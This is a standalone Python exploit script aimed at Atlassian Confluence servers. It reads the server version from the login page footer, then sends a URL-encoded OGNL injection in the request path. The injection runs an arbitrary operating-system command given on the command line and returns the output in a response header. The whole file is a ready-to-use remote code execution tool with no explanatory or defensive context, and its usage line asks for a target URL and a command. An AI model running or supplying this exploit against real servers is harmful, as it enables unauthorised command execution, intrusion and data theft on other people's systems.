import requests
import re
import sys
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings()

def check(host):

	r = requests.get(host+"/login.action", verify=False)
	if(r.status_code == 200):
		filter_version = re.findall("<span id='footer-build-information'>.*</span>",r.text)
		if(len(filter_version)>=1):
			version = filter_version[0].split("'>")[1].split('</')[0]
			return version
		else:
			return False
	else:
		return host
def exploit(host, command):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
    }
    r = requests.get(host + '/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22'+command+'%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/', headers=headers, verify=False, allow_redirects=False)
    if(r.status_code == 302):
        return r.headers['X-Cmd-Response']
    else:
        return False

if(len(sys.argv) < 3):
	print("USE: python3 " + sys.argv[0] + " https://target.com cmd")
	print("ex: python3 " + sys.argv[0] + " https://target.com id")

else:
	target = sys.argv[1]
	cmd = sys.argv[2]
	version = check(target)
	print("============ GET Confluence Version ============")
	if(version):
		print("Version: " + version)
	else:
		print("Version: Not Found")
	print(exploit(target, cmd))
